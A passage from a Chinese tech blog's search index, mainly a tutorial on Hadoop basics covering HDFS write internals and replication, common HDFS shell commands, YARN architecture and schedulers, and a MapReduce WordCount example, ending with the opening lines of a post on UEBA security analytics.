title="DFSOutputStream内部原理"></a>DFSOutputStream内部原理</h4><ol><li>创建Packet<br>Client写数据时，会将字节流数据缓存到内部的缓冲区中，当长度满足一个Chunk大小（512B）时，便会创建一个Packet对象，然后向该Packet对象中写ChunkChecksum校验和数据，以及实际数据块ChunkData，校验和数据是基于实际数据块计算得到的。每次满足一个Chunk大小时，都会向Packet中写上述数据内容，直到达到一个Packet对象大小（64K），就会将该Packet对象放入到dataQueue队列中，等待DataStreamer线程取出并发送到DataNode节点。</li><li>发送Packet<br>DataStreamer线程从dataQueue队列中取出Packet对象，放到ackQueue队列中，然后向DataNode节点发送这个Packet对象所对应的数据。</li><li>接收Ack<br>发送一个Packet数据包以后，会有一个用来接收Ack的ResponseProcessor线程，如果收到成功的ack，则表示一个Packet发送成功；如果成功，则ResponseProcessor线程会将ackQueue队列中对应的Packet删除。</li></ol><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749483523837-6f38cdd4-0637-424f-8ebc-762ad737e640.png"></p><h4 id="读写过程中如何保证数据完整性"><a href="#读写过程中如何保证数据完整性" class="headerlink" title="读写过程中如何保证数据完整性"></a>读写过程中如何保证数据完整性</h4><p><font style="color:rgba(0, 0, 0, 0.9);">HDFS在读写过程中采取多种机制来保证数据完整性。在写入数据时，HDFS会将文件分割成多个固定大小的Block，每个Block会被复制多份（通常默认是三份），这些副本会被存储在不同的数据节点上。当数据写入时，NameNode会负责协调块的分配和副本的存储位置。数据首先写入到一个数据节点，然后通过内部的管道机制将数据顺序地复制到其他副本节点。在复制过程中，每个数据节点会对块数据计算校验和，并将校验和信息与数据块一起存储。当读取数据时，客户端会从NameNode获取块的位置信息，然后直接从数据节点读取数据。在读取过程中，客户端会利用校验和来验证数据的完整性。如果发现某个块的校验和与存储时计算的校验和不一致，说明该块数据可能损坏。此时，客户端可以从其他副本节点读取该块数据，因为每个块都有多个副本存储在不同的节点上。通过这种数据块的多副本存储、校验和验证以及副本间的冗余机制，HDFS能够在分布式环境下有效保证数据的完整性，即使部分数据节点出现故障或者数据在传输过程中发生损坏，也能够通过副本恢复和校验来确保数据的准确性和完整性。</font></p><h4 id="副本放置策略"><a href="#副本放置策略" class="headerlink" title="副本放置策略"></a>副本放置策略</h4><p>HDFS的副本放置策略是其保证数据可靠性和性能的关键机制之一，以下是其主要策略：</p><ol><li>默认副本数量<ol><li>默认值：HDFS默认将每个数据块复制为3个副本，这种多副本机制可以有效提高数据的可靠性和容错能力。</li><li>可配置性：用户可以根据实际需求调整副本数量。例如，在对数据可靠性要求极高的场景中，可以增加副本数量；在对存储空间要求较高的场景中，可以适当减少副本数量。</li></ol></li><li>副本放置规则<ol><li>副本1：第一份副本通常放置在上传数据的节点所在的机架上，这样可以减少数据传输的延迟，提高写入性能；</li><li>副本2：第二份副本放置在与第一副本不同的机架上，这种跨机架放置策略可以有效防止整个机架故障导致数据丢失；</li><li>副本3：第三份副本放置在与第二副本相同的机架上，但与第二副本不同的节点上，这种放置策略可以在保证数据可靠性的同时，避免跨机架通信的高成本；</li><li>副本N：如果配置了更多的副本，HDFS会继续按照上述规则进行放置，尽量分散到不同的机架和节点上，以进一步提高数据的可靠性。</li></ol></li></ol><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749469314542-d5817ccf-4e6b-41f1-816e-6d609f242739.png"></p><h3 id="HDFS常用命令"><a href="#HDFS常用命令" class="headerlink" title="HDFS常用命令"></a>HDFS常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">hdfs dfs -<span class="built_in">ls</span><span class="comment"># 列出当前目录下的文件和子目录信息</span></span><br><span class="line">hdfs dfs -<span class="built_in">ls</span> /<span class="comment"># 查看根目录下的文件和子目录</span></span><br><span class="line">hdfs dfs -<span class="built_in">ls</span> -l /<span class="comment"># 列出根目录下的文件和子目录，并显示详细信息（权限、大小、修改时间等）</span></span><br><span class="line">hdfs dfs -<span class="built_in">ls</span> -lh /<span class="comment"># 以更易读的格式显示文件大小（如KB、MB、GB）</span></span><br><span class="line">hdfs dfs -<span class="built_in">ls</span> -R /<span class="comment"># 递归显示目录和子目录中的所有文件</span></span><br><span class="line">hdfs dfs -<span class="built_in">ls</span> -h<span class="comment"># 以易读格式显示文件大小</span></span><br><span class="line">hdfs dfs -<span class="built_in">du</span> -h<span class="comment"># 查看目录或文件的磁盘空间占用情况</span></span><br><span class="line">hdfs dfs -<span class="built_in">du</span> -h /<span class="comment"># 查看根目录下各目录的磁盘占用情况</span></span><br><span class="line"></span><br><span class="line">hdfs dfs -<span class="built_in">mkdir</span> /user/hadoop<span class="comment"># 在HDFS的/user目录下创建hadoop目录</span></span><br><span class="line">hdfs dfs -<span class="built_in">mkdir</span> -p /user/hadoop/dir1/dir2<span class="comment"># 递归创建目录，即使父目录不存在也会创建</span></span><br><span class="line"></span><br><span class="line">hdfs dfs -<span class="built_in">rm</span> /user/hadoop/file.txt<span class="comment"># 删除指定文件</span></span><br><span class="line">hdfs dfs -<span class="built_in">rm</span> -r /user/hadoop/dir1<span class="comment"># 递归删除指定目录及其内容</span></span><br><span class="line">hdfs dfs -<span class="built_in">rm</span> -r -f /user/hadoop/dir1<span class="comment"># 强制递归删除指定目录及其内容，不会提示确认</span></span><br><span class="line"></span><br><span class="line">hdfs dfs -<span class="built_in">cat</span> /user/hadoop/file.txt<span class="comment"># 查看文件的内容</span></span><br><span class="line">hdfs dfs -<span class="built_in">tail</span> /user/hadoop/file.txt<span class="comment"># 查看文件末尾的内容，默认显示最后4KB</span></span><br><span class="line">hdfs dfs -text /user/hadoop/file.txt<span class="comment"># 查看文件内容，适用于文本文件</span></span><br><span class="line"></span><br><span class="line">hdfs dfs -put localfile /user/hadoop/<span class="comment"># 将本地文件localfile上传到HDFS的/user/hadoop目录下</span></span><br><span class="line">hdfs dfs -put -f localfile /user/hadoop/<span class="comment"># 强制覆盖目标目录下同名文件</span></span><br><span class="line">hdfs dfs -copyFromLocal localfile /user/hadoop/<span class="comment"># 将本地文件上传到HDFS，功能与-put相同</span></span><br><span class="line"></span><br><span class="line">hdfs dfs -get /user/hadoop/file.txt localdir/<span class="comment"># 将HDFS中的file.txt下载到本地目录localdir</span></span><br><span class="line">hdfs dfs -getmerge /user/hadoop/output localfile<span class="comment"># 将HDFS目录下的多个文件合并到本地一个文件中</span></span><br><span class="line"></span><br><span class="line">hdfs dfsadmin -report<span class="comment"># 查看HDFS的文件系统状态，包括数据块总数、已用空间、剩余空间等</span></span><br><span class="line">hdfs dfs -<span class="built_in">df</span> -h<span class="comment"># 以易读格式显示HDFS文件系统的磁盘使用情况</span></span><br><span class="line"></span><br><span class="line">hdfs dfs -<span class="built_in">chmod</span> 755 /user/hadoop/file.txt<span class="comment"># 更改文件的权限为755</span></span><br><span class="line">hdfs dfs -<span class="built_in">chown</span> hadoop /user/hadoop/file.txt<span class="comment"># 更改文件的所有者为hadoop</span></span><br><span class="line">hdfs dfs -<span class="built_in">chgrp</span> hadoopgroup /user/hadoop/file.txt<span class="comment"># 更改文件的所属组为hadoopgroup</span></span><br><span class="line"></span><br><span class="line">hdfs dfs -<span class="built_in">stat</span> /user/hadoop/file.txt<span class="comment"># 查看文件的基本信息（如大小、权限、最后修改时间等）</span></span><br><span class="line">hdfs dfs -hadoop fsck / -files -blocks<span class="comment"># 检查文件系统的完整性并列出文件和块信息</span></span><br></pre></td></tr></table></figure><h2 id="YARN"><a href="#YARN" class="headerlink" title="YARN"></a>YARN</h2><h3 id="YARN基本架构"><a href="#YARN基本架构" class="headerlink" title="YARN基本架构"></a>YARN基本架构</h3><p>YARN是Hadoop中用于进行集群资源管理的重要组件，主要由Resource Manager（RM）、Node Manager（NM）、Application Master（AM）和Container四个部分组成。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749630485102-26e91564-6a30-4c2a-939d-b98b5accf1c4.png"></p><p>Resource Manager是整个Hadoop集群中资源的最高管理者。客户端将MapReduce任务提交给Resource Manager，Resource Manager不断地处理客户端提交的请求。同时，Resource Manager还在时刻着监控Hadoop集群所有Node Manager节点的状态。客户端将MapReduce任务提交给Resource Manager后，首先进行资源的分配和调度，然后Resource Manager会启动Application Master运行这些MapReduce任务。Application Master上运行着MapReduce任务，并且每隔一段时间向Resource Manager发送MapReduce任务运行的状态信息，Resource Manager负责收集并监控Application Master的状态。Resource Manager的主要作用如下：</p><ol><li>处理客户端请求</li><li>监控Node Manager</li><li>启动或监控Application Master</li><li>资源的分配和调度</li></ol><p>Node Manager是单个节点上资源的最高管理者。但是Node Manager在分配和管理资源之前，首先要向Resource Manager申请资源，同时还要每隔一段时间向Resource Manager上报资源使用情况。当Node Manager收到来自Application Master的资源申请时，就会向Application Master分配和调度所需资源。Node Manager的主要作用如下：</p><ol><li>管理所在节点上的资源</li><li>处理来自Resource Manager的命令</li><li>处理来自Application Master的命令</li></ol><p>Application Master主要负责为每一个任务进行资源的申请、调度和分配。向Resource Manager申请资源，与Node Manager进行交互，监控并汇报任务的运行状态、申请的资源的使用情况和作业的进度等信息。同时，跟踪任务状态和进度，定时向Resource Manager发送心跳消息，上报资源的使用情况和应用的进度信息。此外，Application Master还负责本作业内的任务的容错。Application Master的主要作用如下：</p><ol><li>负责数据的切分</li><li>为应用程序申请资源并分配给其包含的任务</li><li>任务的监控与容错</li></ol><p>Container是Yarn中资源的抽象，它封装了某个Node Manager节点上多维度资源，例如CPU、内存、磁盘、网络等。</p><h3 id="YARN工作机制"><a href="#YARN工作机制" class="headerlink" title="YARN工作机制"></a>YARN工作机制</h3><p>对于一个MapReduce程序，用户首先将该程序的jar提交到客户端所在的节点，该行为由Yarn的上游发起，接着流程交给Yarn进行工作处理：</p><ol><li>申请Application：Resource Manager的主要作用之一就是负责处理客户端发来的请求。当用户将一个MapReduce程序的jar提交到客户端所在的节点后，位于该节点上的YarnRunner会向整个Hadoop集群中资源的最高管理者Resource Manager发送一次请求，申请一个Application。</li><li>分配资源提交路径：当Resource Manager接收到客户端发送来的Application申请后，Resource Manager会为客户端分配一个Application资源提交的路径，以及Application编号application_id。该资源提交路径实质为HDFS分布式文件系统的目录，也就是说Yarn会利用HDFS为MapReduce程序的运行提供存储资源。</li><li>提交运行资源：当Resource Manager会为客户端分配一个Application资源提交的路径后，客户端会向该路径提交任务运行所需要的所有资源，例如job.split、job.xml和MapReduce程序的jar包。其中，job.split表示切片的规划，job.xml表示job运行时的配置文件。</li><li>申请运行MRAppmaster：当客户端会向Application资源提交路径提交任务运行所需要的所有资源后，客户端会再次向Resource Manager发送一次申请，申请运行MRAppmaster。</li><li>初始化Task：当Resource Manager接收到客户端发送来的运行MRAppmaster申请后，Resource Manager会将该申请初始化为一个Task，并将该Task放入FIFO调度队列中，等待任务调度。</li><li>领取Task任务：当Task放入FIFO调度队列后，等待任务调度。Resource Manager除了能够处理来自客户端的请求外，还能够监控Node Manager的资源使用情况和状态。当Resource Manager监控到某个Node Manager正处于空闲状态并资源充足，Resource Manager会从FIFO调度队列的头部拉取Task任务，然后分配给Node Manager。此时，单个节点上资源的最高管理者Node Manager就会从FIFO调度队列的头部领取Task任务，然后处理该Task任务。</li><li>创建容器Container：当Node Manager就会从FIFO调度队列的头部领取Task任务后，Node Manager会将运行该Task任务所需的CPU、RAM等资源和MRAppmaster封装到一个Container中。</li><li>下载任务资源到本地：Container中的MRAppmaster实质上就是Application Master。Application Master主要负责为每一个任务进行资源的申请、调度和分配。当Application Master去运行任务时，首先要去下载任务的切片信息、任务运行时的配置文件以及任务运行的MapReduce程序jar包。</li><li>申请运行MapTask容器：当MRAppmaster将任务资源下载完毕后，MRAppmaster会向Resource Manager申请运行MapTask容器。Resource Manager接收到客户端发送来的运行MapTask容器申请后，会将该申请初始化为一个MapTask，并将该Task放入FIFO调度队列中。当Resource Manager监控到某个Node Manager正处于空闲状态并资源充足，Resource Manager会从FIFO调度队列的头部拉取MapTask任务，然后分配给Node Manager。</li><li>领取MapTask任务，创建MapTask容器：当Node Manager就会从FIFO调度队列的头部领取MapTask任务后，Node Manager会将运行该MapTask任务所需的CPU、RAM等资源和jar包封装到一个Container中。</li><li>发送程序启动脚本：当Node Manager将运行MapTask任务所需的CPU、RAM等资源和jar包封装到一个Container后，MRAppmaster会向Node Manager发送程序启动脚本，启动MapTask。</li><li>申请运行ReduceTask容器：当Node Manager运行完MapTask任务后，MRAppmaster会向Resource Manager申请资源来运行ReduceTask容器。</li><li>获取分区数据：当MRAppmaster向Resource Manager申请资源来运行ReduceTask容器后，ReduceTask容器会向MapTask容器获取相应分区的数据。</li><li>注销MRAppmaster：当ReduceTask容器向MapTask容器获取相应分区的数据并运行完ReduceTask后，MRAppmaster向Resource Manager发出注销请求。Resource Manager接收到注销请求后，会立马注销MRAppmaster，并释放相关资源。</li></ol><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749630533174-f1c76c8a-57c0-467c-899f-750ae0b1270b.png"></p><h3 id="资源调度器"><a href="#资源调度器" class="headerlink" title="资源调度器"></a>资源调度器</h3><p>在集群软硬件配置都确定的情况下，集群性能将取决于ResourceManager的性能，更准确的说是取决于资源管理器ResourceManager中的调度器Scheduler给不同计算作业任务job分配计算容器Container的规则机制，因此调度器Scheduler组件的任务资源调度机制将很大程度地影响着集群整体性能效率的发挥。</p><p>目前，Hadoop集群提供的作业调度器有先进先出调度器（FIFO Scheduler）、容量调度器（Capacity Scheduler）和公平调度（Fair Scheduler）。</p><h4 id="FIFO-Scheduler"><a href="#FIFO-Scheduler" class="headerlink" title="FIFO Scheduler"></a>FIFO Scheduler</h4><p>先进先出调度器（FIFO Scheduler）的工作机制相对简单，就是将计算作业任务job按照其提交的先后顺序加入到容器Container的使用队列中，jobs根据其加入队列的先后顺序依次执行。具体在资源分配时，优先给队列头部的job分配资源，在job所需资源得到满足时就会开始执行该job。待前面任务job执行完毕后，就会继续为后面的job分配资源。如下图所示，在job1提交到集群后，先进先出调度器将优先将全部资源分配给job1。虽然在job1执行期间job2也被提交到集群，但由于job1仍在执行，所以先进先出调度器只有在job1执行完毕后才将全部资源分配给job2，继而执行job2。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749785999340-67a3445f-b876-4619-8db2-59996c4d13f8.png"></p><h4 id="Capacity-Scheduler"><a href="#Capacity-Scheduler" class="headerlink" title="Capacity Scheduler"></a>Capacity Scheduler</h4><p>容量调度器（CapacityScheduler）的目标是实现多租户安全地共享一个大型集群，同时最大限度地提高集群的吞吐量和利用率，Hadoop3.2.2默认的资源调度器就是容量调度器。容量调度器主要是通过引入“队列”概念来实现资源的有效分配和管理，其中可以将“队列”理解为多个容器Container组成的集合。通过将大集群的整体资源划分为多个队列，不同队列拥有不同数量的资源容器Container，队列间的计算作业相互隔离，每个队列以既定原则（如FIFO）调度其内部的计算作业任务。</p><p>容量调度器为了提高集群资源的利用率，允许队列访问其他队列未使用的任何过剩资源容量。这是以经济有效的方式为组织提供了弹性，简单理解就是队列的资源容量可以弹性变化，称为“弹性队列”。但这种弹性共享并不是无限制的，在日常开发中一般会增加配置项，用来限制每个队列最大的资源占比。</p><p>如下图所示，容量调度器将集群容量划分为队列A和B，队列A占用的资源比例较大，队列B占用的资源比例较小。队列A开始执行job1时需要较多资源，队列B没有执行任务而出现资源空闲，此时队列B可以将其占有的资源共享给队列A，加快job1的执行速度。当job2被提交后，队列B会从队列A处要回其原来本应拥有的资源，用于执行job2。虽然job1需要占用较多资源，但由于job1和job2属于不同的队列，因此job1的执行不会影响job2的开始。当job2执行完毕后，队列B又可以将其占有的资源共享给队列A。从图上观察发现队列A并不会占用队列B的全部资源，因为这集群会限制队列A占用资源的比例。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749786057692-d164d8c6-c669-4a93-b1d9-d185888ffe67.png"></p><h4 id="Fair-Scheduler"><a href="#Fair-Scheduler" class="headerlink" title="Fair Scheduler"></a>Fair Scheduler</h4><p>公平调度器（FairScheduler）是由Facebook公司开发的实现多用户共享集群资源的调度机制，允许YARN计算作业任务在大型集群中公平地共享集群资源。默认情况下，公平调度器只基于集群内存资源进行调度，但用户可以自行配置为基于集群内存和CPU的资源调度。当只有单个计算作业任务运行时，该任务使用整个集群的资源；当有新的计算作业任务提交到集群时，集群将释放部分资源分配给新任务，最终实现每个任务从集群中获得大致相同数量的资源；如果有更多新的计算作业任务提交到集群时，也会依次类推的实现每个任务从集群中获得大致相同数量的资源。</p><p>如下图所示，job1提交到集群时，由于集群没有执行其他job，job1将占用集群的全部资源来执行任务。在job1执行期间job2被提交到集群，job1会释放部分资源用于执行job2，此时job1和job2各占用集群资源一半。在job2执行完毕后集群又会将全部资源用于执行job1。在公平调度器的调度下，可以让部分小任务在合理的时间内完成，也不会使大任务长期无法完成。</p><p>如下图所示，job1提交到集群时，由于集群没有执行其他job，job1占用集群的全部资源来执行任务。在job1执行期间job2被提交到队列B，队列A就会向队列B归还原应占用的资源，用于执行job2，此时job1和job2都占用各自所在队列的全部资源。在job2执行期间job3被提交到队列B，job2会释放部分资源用于执行job3，此时job2和job3占用所在队列资源的一半。在job2执行完毕后，job3就会占用队列B的全部资源。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749786101334-f4423abc-d019-4e2f-8aad-b8bd21d7ea41.png"></p><h2 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h2><h3 id="MapReduce基本介绍"><a href="#MapReduce基本介绍" class="headerlink" title="MapReduce基本介绍"></a>MapReduce基本介绍</h3><p>MapReduce是一种分布式并行计算编程模型，由Google在2004年提出，用于大规模数据集（TB&#x2F;PB级）的批处理。其核心思想是“分而治之”，将计算任务分为Map和Reduce两个阶段：</p><ul><li>Map阶段，将输入数据分割为多个分片（Split），由多个Map任务并行处理，生成中间键值对（如&lt;单词, 1&gt;）；</li><li>Reduce阶段，对中间结果按键分组，由Reduce任务汇总（如统计单词频次）。</li></ul><h3 id="MapReduce工作流程"><a href="#MapReduce工作流程" class="headerlink" title="MapReduce工作流程"></a>MapReduce工作流程</h3><p>MapReduce工作的流程如下：</p><ol><li>输入分片（Input Split）</li></ol><p>当用户提交一个MapReduce作业时，首先需要指定输入文件。MapReduce框架会将输入文件分割成一个个小的数据块，称为“输入分片”（Input Split）。每个输入分片的大小通常与HDFS中的块大小相等（默认128MB）。例如，如果有一个1GB的文件，HDFS块大小为128MB，那么这个文件会被分割成8个输入分片，这样做的目的是为了将大规模的数据分解成多个小任务，便于在不同的节点上并行处理。</p><ol start="2"><li>Map阶段</li></ol><p>每个输入分片会被分配给一个Map任务（Map Task）。Map任务会读取输入分片中的数据，对数据进行处理，并产生一系列的中间结果。这些中间结果通常以键值对&lt;key, value&gt;的形式输出。例如，在一个词频统计的场景中，Map任务会读取输入分片中的文本行，将每一行拆分成单词，然后输出键值对，其中键是单词，值是1（表示该单词出现了一次）。如果输入分片中有”hello world”这行文本，那么Map任务会输出两个键值对：&lt;”hello”, 1&gt;和&lt;”world”, 1&gt;。</p><ol start="3"><li>Shuffle阶段</li></ol><p>这是MapReduce中非常关键的一步。当Map任务输出中间结果后，这些中间结果会被分配到不同的Reduce任务中，分配的依据是中间结果的键（key）。MapReduce框架会根据键的范围或哈希值等规则，将具有相同键的中间结果归并到一起，并发送给同一个Reduce任务。例如，假设键是单词，那么所有键为”hello”的中间结果都会被发送到同一个Reduce任务。在这个过程中，数据会从Map节点传输到Reduce节点，这个过程称为Shuffle。Shuffle阶段是MapReduce性能的关键因素之一，因为数据的传输可能会占用大量的网络带宽。</p><ol start="4"><li>Reduce阶段</li></ol><p>Reduce任务会接收到分配给它的所有中间结果。对于每个键，Reduce任务会将所有与该键相关的值合并在一起，产生最终的输出结果。继续以词频统计为例，如果Reduce任务接收到键为“hello”的中间结果&lt;”hello”, 1&gt;、&lt;”hello”, 1&gt;、&lt;”hello”, 1&gt;，那么它会将这些值合并，输出最终结果&lt;”hello”, 3&gt;，表示单词”hello”总共出现了3次。最终，Reduce任务将结果写入到输出文件中。每个Reduce任务对应一个输出文件，所有输出文件共同构成了MapReduce作业的最终结果。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749486799095-7bf26d99-19b0-4a5d-9034-0d66dcd27916.png"></p><p>MapReduce编程模型中，Splitting和Shuffing操作都是由框架实现的，需要自己编程实现的只有Mapping和Reducing，这也是MapReduce这个称呼的来源。</p><h3 id="MapReduce案例实践"><a href="#MapReduce案例实践" class="headerlink" title="MapReduce案例实践"></a>MapReduce案例实践</h3><p>继承Mapper类和Reducer类，并重写map方法和reduce方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCount</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TokenizerMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;Object, Text, Text, IntWritable&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">IntWritable</span> <span class="variable">one</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">private</span> <span class="type">Text</span> <span class="variable">word</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(Object key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">            String[] words = value.toString().split(<span class="string">&quot;\\W+&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (String w : words) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!w.isEmpty()) &#123;</span><br><span class="line">                    word.set(w.toLowerCase());</span><br><span class="line">                    context.write(word, one);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">IntSumReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable, Text, IntWritable&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">IntWritable</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (IntWritable val : values) &#123;</span><br><span class="line">                sum += val.get();</span><br><span class="line">            &#125;</span><br><span class="line">            result.set(sum);</span><br><span class="line">            context.write(key, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">conf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(conf, <span class="string">&quot;word count&quot;</span>);</span><br><span class="line">        job.setJarByClass(WordCount.class);</span><br><span class="line">        job.setMapperClass(TokenizerMapper.class);</span><br><span class="line">        job.setCombinerClass(IntSumReducer.class);</span><br><span class="line">        job.setReducerClass(IntSumReducer.class);</span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class);</span><br><span class="line">        FileInputFormat.addInputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(args[<span class="number">0</span>]));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(args[<span class="number">1</span>]));</span><br><span class="line">        System.exit(job.waitForCompletion(<span class="literal">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749527951994-7f74bc89-45c2-43c8-8692-c2ac2717b819.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/MXfoVF27ZHL084YELMD9HQ">Hadoop实战：使用Docker Compose部署Hadoop集群</a></p>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UEBA基础</title>
      <link href="/2025/06/09/UEBA%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/06/09/UEBA%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="UEBA概念"><a href="#UEBA概念" class="headerlink" title="UEBA概念"></a>UEBA概念</h2><p>UEBA（User and Entity Behavior Analytics，用户和实体行为分析）主要用于检测用户以及网络中实体（网络设备、进程、应用程序等）的异常行为，然后判断异常行为是否存在安全威胁，并及时向运维人员发出告警。UEBA可以在企业现有网络安全系统或解决方案的基础上，增强企业的安全能力，覆盖传统安全系统或解决方案无法覆盖的盲点，降低企业的安全风险。在实际应用中，UEBA大都和其他安全系统或解决方案一起部署，以获得更好的安全和检测性能。</p><h2 id="UEBA原理"><a href="#UEBA原理" class="headerlink" 